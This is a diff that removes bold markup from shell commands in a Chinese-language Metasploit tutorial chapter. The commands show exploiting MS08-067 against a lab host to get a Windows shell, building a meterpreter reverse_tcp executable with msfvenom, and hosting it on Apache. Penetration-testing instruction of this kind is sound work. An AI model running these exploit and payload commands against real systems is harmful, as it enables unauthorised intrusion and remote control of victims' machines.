@@ -19,19 +19,19 @@ Metasploit 的模块化和灵活架构帮助开发人员在发现新漏洞时高
 让我们启动 Metasploit 并攻击我们的第一个系统。在 Kali Linux 中，Metasploit 在我们的路径中，因此我们可以在系统中的任何位置启动它。但在启动 Metasploit 之前，你需要启动 PostgreSQL 数据库，Metasploit 会使用它来跟踪你的操作。
 
 ```
-root@kali:~# **service postgresql start**
+root@kali:~# service postgresql start
 ```
 
 现在你已经准备好启动 Metasploit 服务。此命令会创建一个名为 *msf3* 的 PostgreSQL 用户，并创建一个相应的数据库来存储我们的数据。它还会启动 Metasploit 的远程过程调用（RPC）服务器和 Web 服务器。
 
 ```
-root@kali:~# **service metasploit start**
+root@kali:~# service metasploit start
 ```
 
 使用 Metasploit 有多种接口。在本章中，我们将使用 Msfconsole，这是一个基于文本的 Metasploit 控制台，以及 Msfcli，这是一个命令行接口。两种接口都可以用来运行 Metasploit 模块，尽管我通常会在 Msfconsole 中花费大部分时间。通过输入 **`msfconsole`** 来启动控制台。
 
 ```
-root@kali:~# **msfconsole**
+root@kali:~# msfconsole
 ```
 
 如果 Msfconsole 看起来停顿了一两分钟，不要惊慌；它正在动态加载 Metasploit 模块树。加载完成后，你将看到一些巧妙的 ASCII 艺术、版本信息和其他细节，以及一个 `msf >` 提示符（见 示例 4-1）。
@@ -467,7 +467,7 @@ msf  exploit(ms08_067_netapi) >
 示例 4-11. Msfcli 帮助
 
 ```
-  root@kali:~# **msfcli -h**
+  root@kali:~# msfcli -h
 ❶ Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode]
   ==============================================================================
 
@@ -494,7 +494,7 @@ msf  exploit(ms08_067_netapi) >
 示例 4-12. 模块选项
 
 ```
-root@kali:~# **msfcli windows/smb/ms08_067_netapi O**
+root@kali:~# msfcli windows/smb/ms08_067_netapi O
 [*] Please wait while we load the module tree...
 
    Name     Current Setting  Required  Description
@@ -513,7 +513,7 @@ root@kali:~# **msfcli windows/smb/ms08_067_netapi O**
 示例 4-13. Msfcli 中的模块有效载荷
 
 ```
-root@kali:~# **msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P**
+root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P
 [*] Please wait while we load the module tree...
 
 Compatible payloads
@@ -539,7 +539,7 @@ Compatible payloads
 示例 4-14. 在 Msfcli 中运行漏洞
 
 ```
-root@kali:~# **msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E**
+root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 PAYLOAD=windows/shell_bind_tcp E
 [*] Please wait while we load the module tree...
 
 RHOST => 192.168.20.10
@@ -577,7 +577,7 @@ C:\WINDOWS\system32>
 示例 4-15. Msfvenom 中的选项
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp -o**
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
 [*] Options for payload/windows/meterpreter/reverse_tcp
 
     Name      Current Setting  Required  Description
@@ -595,7 +595,7 @@ root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp -o**
 现在告诉 Msfvenom 使用哪个输出格式。我们是要从 Windows 可执行文件运行这个有效载荷，还是要制作一个可以上传到我们已经获得写入权限的 Web 服务器的 ASP 文件？要查看所有可用的输出格式，请输入**`msfvenom --help-formats`**。
 
 ```
-root@kali:~# **msfvenom --help-formats**
+root@kali:~# msfvenom --help-formats
 Executable formats
     asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small,
       loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war
@@ -613,8 +613,8 @@ msfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe
 但是，如果你按原样运行这个命令，你会看到控制台输出垃圾信息。虽然这在技术上是我们的可执行有效载荷，但它对我们没有什么帮助。相反，我们将输出重定向到一个可执行文件，*chapter4example.exe*。
 
 ```
-root@kali:~# **msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe** > **chapter4example.exe**
-root@kali:~# **file chapter4example.exe**
+root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > **chapter4example.exe**
+root@kali:~# file chapter4example.exe
 chapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
 ```
 
@@ -627,8 +627,8 @@ chapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
 首先，运行 **`cp chapter4example.exe /var/www`** 将有效载荷可执行文件复制到 Apache 目录，然后确保通过 **`service apache2 start`** 启动 Web 服务器。
 
 ```
-root@kali:~# **cp chapter4example.exe /var/www**
-root@kali:~# **service apache2 start**
+root@kali:~# cp chapter4example.exe /var/www
+root@kali:~# service apache2 start
 Starting web server apache2                                           [ OK ]
 ```
 
@@ -750,7 +750,7 @@ msf  auxiliary(pipe_auditor) >
 本书中的所有内容均适用于 Kali 1.0.6 上安装的 Metasploit 版本。随着你作为渗透测试员的职业发展，你会希望使用最新的 Metasploit 模块。Metasploit 项目通常会非常稳定地发布适用于最新网络安全问题的模块。要从 Metasploit 的 GitHub 拉取最新的模块，可以输入以下命令：root@kali:~# msfupdate
 
 ```
-root@kali:~# **msfupdate**
+root@kali:~# msfupdate
 ```
 
 ## 总结
